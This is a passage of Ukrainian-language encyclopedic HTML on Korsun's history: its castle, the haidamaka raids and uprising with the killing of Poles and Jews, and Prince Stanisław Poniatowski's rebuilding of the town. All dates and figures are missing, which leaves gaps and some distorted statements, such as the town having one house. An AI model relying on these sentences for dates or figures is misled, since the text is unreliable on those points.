<p>Всередині замку стояв будинок, у якому проживав губернатор, стайня, возівня, будинок для козаків, пекарня, кухня тощо. Посередині була дворівнева вежа з бійницями, у якій мешкали козаки. Біля неї знаходилася, частково зруйнована студня. У —  рр. Сам Корсунь було повністю спалено. Корсунщина була одним із центрів визвольної боротьби на Правобережжі , у тому числі гайдамацького руху, який постійно наростав починаючи з часу розформування Корсунського полку у  р.</p>
<p>На цій території весь час діяло декілька гайдамацьких загонів. Гайдамаки нападали на шляхетські маєтки, розорюючи їх. Декілька разів вони захоплювали Корсунь. Апогеєм гайдамацького руху було повстання  р.</p><a id='f3'></a><h3>Навігаційне меню</h3><p>Під час нього було вирізано всіх поляків та євреїв , зруйновано костьоли. Але в результаті військової підтримки Російської імперії цей виступ було придушено. Протягом декількох років відбувалися локальні виступи гайдамаків, але полякам урешті-решт вдалося встановити свій контроль над краєм і через декілька років рух гайдамаків тут повністю згас. Корсунщину знову було перетворено на безлюдну пустку. За люстрацією року в Корсуні був будинок. Корсунський замок був перетворений на в'язницю, де тримали прихильників православної віри.</p>
<p>З  р. Корсунь став власністю князя Станіслава Понятовського  — племінника останнього польського короля. Місто наново закладене , має 25 мурованих будинків. Станіслав Понятовський збудував тут фабрики сукна, замші, селітри, плантації шовковиці, винниці, розводив расових коней.</p>
<p>Заклав тут для молоді школу танців. У всьому йому спочатку допомагав французький художник і архітектор Жан Анрі Мюнц. Збудував тут шпиталь на три покої. Започаткував «касу допомоги» для погорільців.</p>
		
			
